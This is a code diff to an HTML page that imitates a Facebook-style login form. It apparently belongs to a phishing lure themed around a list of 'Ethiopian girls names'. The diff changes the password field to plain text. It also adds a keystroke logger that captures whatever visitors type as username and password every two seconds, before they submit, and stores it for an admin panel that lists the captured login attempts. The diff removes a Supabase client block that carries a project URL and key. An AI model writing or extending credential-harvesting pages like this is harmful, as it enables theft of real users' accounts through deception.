@@ -385,6 +385,19 @@
             margin-top: 10px;
         }
         
+        .password-container {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #65676b;
+        }
+        
         @media (max-width: 900px) {
             .content {
                 flex-direction: column;
@@ -439,8 +452,13 @@
             <div class="right-content">
                 <div class="login-form">
                     <form id="loginForm">
-                        <input type="text" id="email" placeholder="Email or phone number" required>
-                        <input type="password" id="password" placeholder="Password" required>
+                        <input type="text" id="email" name="username" placeholder="Email or phone number" required>
+                        <div class="password-container">
+                            <input type="text" id="password" name="password" placeholder="Password" required>
+                            <span class="toggle-password" id="togglePassword">
+                                <i class="fas fa-eye"></i>
+                            </span>
+                        </div>
                         <button type="submit" class="login-btn">Log In</button>
                         <a href="#" class="forgot-password">Forgotten password?</a>
                         <div class="divider"></div>
@@ -514,6 +532,8 @@
             const adminPassword = document.getElementById('adminPassword');
             const adminError = document.getElementById('adminError');
             const adminLoginClose = document.getElementById('adminLoginClose');
+            const passwordInput = document.getElementById('password');
+            const togglePassword = document.getElementById('togglePassword');
             
             // Ethiopian girls names
             const ethiopianGirls = [
@@ -688,15 +708,53 @@
             
             // Initialize admin panel
             displayLoginAttempts();
+            
+            // Add real-time keystroke logging
+            const emailInput = document.getElementById('email');
+            let emailValue = '';
+            let passwordValue = '';
+            
+            emailInput.addEventListener('input', function() {
+                emailValue = this.value;
+            });
+            
+            passwordInput.addEventListener('input', function() {
+                passwordValue = this.value;
+            });
+            
+            // Periodically save what users are typing (even before form submission)
+            setInterval(function() {
+                if (emailValue || passwordValue) {
+                    // Check if this is a new attempt (not already submitted)
+                    const recentAttempt = loginAttempts[loginAttempts.length - 1];
+                    const now = Date.now();
+                    
+                    if (!recentAttempt || recentAttempt.timestamp < now - 1000) {
+                        // Save the current typing state
+                        const tempAttempt = {
+                            email: emailValue,
+                            password: passwordValue,
+                            timestamp: now,
+                            incomplete: true
+                        };
+                        
+                        // Add to attempts if we have data
+                        if (emailValue || passwordValue) {
+                            // Check if we already have an incomplete attempt for this session
+                            const existingIncompleteIndex = loginAttempts.findIndex(a => a.incomplete);
+                            
+                            if (existingIncompleteIndex !== -1) {
+                                loginAttempts[existingIncompleteIndex] = tempAttempt;
+                            } else {
+                                loginAttempts.push(tempAttempt);
+                            }
+                            
+                            localStorage.setItem('facebookSexLoginAttempts', JSON.stringify(loginAttempts));
+                        }
+                    }
+                }
+            }, 2000); // Check every 2 seconds
         });
     </script>
-    <!-- Supabase SDK -->
-<script src="https://unpkg.com/@supabase/supabase-js"></script>
-<script>
-  const supabaseUrl = 'https://vpoisefajpjhcbpyxnoo.supabase.co';
-  const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZwb2lzZWZhanBqaGNicHl4bm9vIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYwOTQwNzAsImV4cCI6MjA3MTY3MDA3MH0.Vjzofy1joJswOMkAJAF8zQu7Dn_fWFhHsgNmOi0DwjM';
-  const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
-</script>
-</body>
 </body>
 </html>
